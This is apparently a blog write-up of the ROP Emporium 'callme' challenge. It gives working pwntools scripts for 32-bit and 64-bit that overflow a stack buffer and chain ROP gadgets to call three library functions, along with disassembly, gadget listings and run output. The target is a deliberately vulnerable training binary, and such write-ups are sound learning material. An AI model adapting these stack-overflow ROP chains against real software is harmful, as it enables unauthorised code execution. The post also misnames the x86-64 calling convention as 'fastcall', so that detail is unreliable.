---
layout: post
title:  "ROP Emporium: callme"
date:   2021-03-09 20:07:56 +0200
categories: ropemporium
---
As we are told in the beginning,
### You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)###

## 32-bit ##
Alright let's look at the disassembly of the vulnerable function, as well as the function that contains useful gadgets.

```
080486ed <pwnme>:
 80486ed:       55                      push   ebp
 80486ee:       89 e5                   mov    ebp,esp
 80486f0:       83 ec 28                sub    esp,0x28
 80486f3:       83 ec 04                sub    esp,0x4
 80486f6:       6a 20                   push   0x20
 80486f8:       6a 00                   push   0x0
 80486fa:       8d 45 d8                lea    eax,[ebp-0x28]
 80486fd:       50                      push   eax
 80486fe:       e8 3d fe ff ff          call   8048540 <memset@plt>
 8048703:       83 c4 10                add    esp,0x10
 8048706:       83 ec 0c                sub    esp,0xc
 8048709:       68 48 88 04 08          push   0x8048848
 804870e:       e8 ed fd ff ff          call   8048500 <puts@plt>
 8048713:       83 c4 10                add    esp,0x10
 8048716:       83 ec 0c                sub    esp,0xc
 8048719:       68 6b 88 04 08          push   0x804886b
 804871e:       e8 ad fd ff ff          call   80484d0 <printf@plt>
 8048723:       83 c4 10                add    esp,0x10
 8048726:       83 ec 04                sub    esp,0x4
 8048729:       68 00 02 00 00          push   0x200
 804872e:       8d 45 d8                lea    eax,[ebp-0x28]
 8048731:       50                      push   eax
 8048732:       6a 00                   push   0x0
 8048734:       e8 87 fd ff ff          call   80484c0 <read@plt>
 8048739:       83 c4 10                add    esp,0x10
 804873c:       83 ec 0c                sub    esp,0xc
 804873f:       68 6e 88 04 08          push   0x804886e
 8048744:       e8 b7 fd ff ff          call   8048500 <puts@plt>
 8048749:       83 c4 10                add    esp,0x10
 804874c:       90                      nop
 804874d:       c9                      leave
 804874e:       c3                      ret

0804874f <usefulFunction>:
 804874f:       55                      push   ebp
 8048750:       89 e5                   mov    ebp,esp
 8048752:       83 ec 08                sub    esp,0x8
 8048755:       83 ec 04                sub    esp,0x4
 8048758:       6a 06                   push   0x6
 804875a:       6a 05                   push   0x5
 804875c:       6a 04                   push   0x4
 804875e:       e8 7d fd ff ff          call   80484e0 <callme_three@plt>
 8048763:       83 c4 10                add    esp,0x10
 8048766:       83 ec 04                sub    esp,0x4
 8048769:       6a 06                   push   0x6
 804876b:       6a 05                   push   0x5
 804876d:       6a 04                   push   0x4
 804876f:       e8 dc fd ff ff          call   8048550 <callme_two@plt>
 8048774:       83 c4 10                add    esp,0x10
 8048777:       83 ec 04                sub    esp,0x4
 804877a:       6a 06                   push   0x6
 804877c:       6a 05                   push   0x5
 804877e:       6a 04                   push   0x4
 8048780:       e8 6b fd ff ff          call   80484f0 <callme_one@plt>
 8048785:       83 c4 10                add    esp,0x10
 8048788:       83 ec 0c                sub    esp,0xc
 804878b:       6a 01                   push   0x1
 804878d:       e8 7e fd ff ff          call   8048510 <exit@plt>
 8048792:       66 90                   xchg   ax,ax
 8048794:       66 90                   xchg   ax,ax
 8048796:       66 90                   xchg   ax,ax
 8048798:       66 90                   xchg   ax,ax
 804879a:       66 90                   xchg   ax,ax
 804879c:       66 90                   xchg   ax,ax
 804879e:       66 90                   xchg   ax,ax
```
From what we can see, ```usefulFunction``` is there only to show us how arguments are passed to the three functions. Obviously, those are not the arguments we desire, so we will have to provide the arguments ourselves in the input.
Also, the offset to the saved return address is the same, 44 bytes.
In order to call the function with the desired parameters on 32 bits we will need to pass the arguments on the stack like so:
```
PLT entry address of function
junk value to act as saved return address
argument 1
argument 2
argument 3
.....
```

However, this is where we encounter a problem: unlike the previous level, this time we need to chain three function calls, each with its own parameters.
In order to ```ret``` into the next function we need to somehow clean the stack of the arguments to avoid a segmentation fault. This can e achieved with some ```pop``` ROP gadgets, which we are given:
```
voidwalker@Abyss:[callmex86]** ROPgadget --binary=callme32 | grep pop
0x0804867c : add byte ptr [eax], al ; add byte ptr [eax], al ; push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
0x080484a8 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x0804867e : add byte ptr [eax], al ; push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
0x080486e4 : add byte ptr [ebx - 0x723603b3], cl ; popal ; cld ; ret
0x080487f5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080484aa : add esp, 8 ; pop ebx ; ret
0x0804867b : daa ; add byte ptr [eax], al ; add byte ptr [eax], al ; push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
0x080487f4 : jecxz 0x8048779 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x080487f3 : jne 0x80487d8 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080484ab : les ecx, ptr [eax] ; pop ebx ; ret
0x080487f6 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x080484a6 : mov dh, 0 ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x08048681 : mov ebp, esp ; pop ebp ; jmp 0x8048610
0x080487f7 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x08048683 : pop ebp ; jmp 0x8048610
0x080487fb : pop ebp ; ret
0x080487f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080484ad : pop ebx ; ret
0x080487fa : pop edi ; pop ebp ; ret
0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
0x08048810 : pop ss ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080486ea : popal ; cld ; ret
0x08048680 : push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
```

The one I am going to use is the gadget that pops exactly 3 values off the stack:
```
0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
```
Right, now let's write our exploit script and get our flag:
```python
#!/usr/bin/env python3

from pwn import *

context.arch = "i386"
context.bits = 32
context.endian = "little"

e = ELF("./callme32")

io = e.process()

print(io.recvuntil('>'))

payload = b"A" * 44

pops = p32(0x080487f9) # pop esi; pop edi; pop ebp; ret

c1 = p32(0x080484f0) # callme_one@plt
c2 = p32(0x08048550) # callme_two@plt
c3 = p32(0x080484e0) # callme_three@plt

p1 = p32(0xdeadbeef)
p2 = p32(0xcafebabe)
p3 = p32(0xd00df00d)

payload += c1
payload += pops
payload += p1 + p2 + p3

payload += c2
payload += pops
payload += p1 + p2 + p3

payload += c3
payload += pops
payload += p1 + p2 + p3

with open('payload', 'wb') as file:
    file.write(payload)

io.sendline(payload)

print(io.recvrepeat())
```
And now for the flag:
```
voidwalker@Abyss:[callmex86]** ./exploit.py
[*] '/home/voidwalker/ROPEmporium/callmex86/callme32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
[+] Starting local process '/home/voidwalker/ROPEmporium/callmex86/callme32': pid 10625
b'callme by ROP Emporium\nx86\n\nHope you read the instructions...\n\n>'
b' Thank you!\ncallme_one() called correctly\ncallme_two() called correctly\nROPE{a_placeholder_32byte_flag!}\n'
```

## 64-bit ##
This time, the only difference, besides the different overflow offset which is 40 bytes, is that the values need to be doubled and we somehow need to pass the values through the registers ```rdi```, ```rsi```, and ```rdx```, with respect to the ```fastcall``` calling convention, specific to 64-bit Linux.
Let's have a look at the available ROP gadgets that pop stuff off the stack:
```
voidwalker@Abyss:[callmex64]** ROPgadget --binary=callme | grep pop
0x0000000000400892 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040083c : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4007d0
0x000000000040083d : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4007d0
0x00000000004007c6 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040083e : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4007d0
0x00000000004007c5 : add byte ptr [rax], r8b ; pop rbp ; ret
0x000000000040083f : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4007d0
0x0000000000400827 : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004007b9 : je 0x4007c8 ; pop rbp ; mov edi, 0x601070 ; jmp rax
0x00000000004007fb : je 0x400808 ; pop rbp ; mov edi, 0x601070 ; jmp rax
0x000000000040093b : lcall [rdi + 0x5e] ; pop rdx ; ret
0x0000000000400822 : mov byte ptr [rip + 0x20084f], 1 ; pop rbp ; ret
0x0000000000400891 : mov eax, 0 ; pop rbp ; ret
0x0000000000400842 : mov ebp, esp ; pop rbp ; jmp 0x4007d0
0x0000000000400841 : mov rbp, rsp ; pop rbp ; jmp 0x4007d0
0x00000000004007c3 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000400805 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400824 : or byte ptr [r8], r12b ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400825 : or byte ptr [rax], ah ; add byte ptr [rcx], al ; pop rbp ; ret
0x000000000040099c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040099e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004009a0 : pop r14 ; pop r15 ; ret
0x00000000004009a2 : pop r15 ; ret
0x0000000000400844 : pop rbp ; jmp 0x4007d0
0x00000000004007bb : pop rbp ; mov edi, 0x601070 ; jmp rax
0x000000000040099b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040099f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007c8 : pop rbp ; ret
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
0x00000000004009a3 : pop rdi ; ret
0x000000000040093e : pop rdx ; ret
0x00000000004009a1 : pop rsi ; pop r15 ; ret
0x000000000040093d : pop rsi ; pop rdx ; ret
0x000000000040099d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400840 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4007d0
```

Looks like we have a candidate right here!
```
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
```
Great! Let's get to the script:

```python
#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
context.bits = 64
context.endian = "little"

e = ELF("./callme")

io = e.process()

print(io.recvuntil('>'))

payload = b"A" * 40

pops = p64(0x40093c) # pop rdi; pop rsi; pop rdx; ret

c1 = p64(0x400720) # callme_one@plt
c2 = p64(0x0400740) # callme_two@plt 
c3 = p64(0x4006f0) # callme_three@plt

p1 = p64(0xdeadbeefdeadbeef)
p2 = p64(0xcafebabecafebabe)
p3 = p64(0xd00df00dd00df00d)

payload += pops
payload += p1 + p2 + p3
payload += c1

payload += pops
payload += p1 + p2 + p3
payload += c2

payload += pops
payload += p1 + p2 + p3
payload += c3

with open('payload', 'wb') as file:
    file.write(payload)

io.sendline(payload)

print(io.recvrepeat())
```
And now for the flag:

```
voidwalker@Abyss:[callmex64]** ./exploit.py
[*] '/home/voidwalker/ROPEmporium/callmex64/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/voidwalker/ROPEmporium/callmex64/callme': pid 11027
b'callme by ROP Emporium\nx86_64\n\nHope you read the instructions...\n\n>'
[*] Process '/home/voidwalker/ROPEmporium/callmex64/callme' stopped with exit code 0 (pid 11027)
b' Thank you!\ncallme_one() called correctly\ncallme_two() called correctly\nROPE{a_placeholder_32byte_flag!}\n'
```

Success!
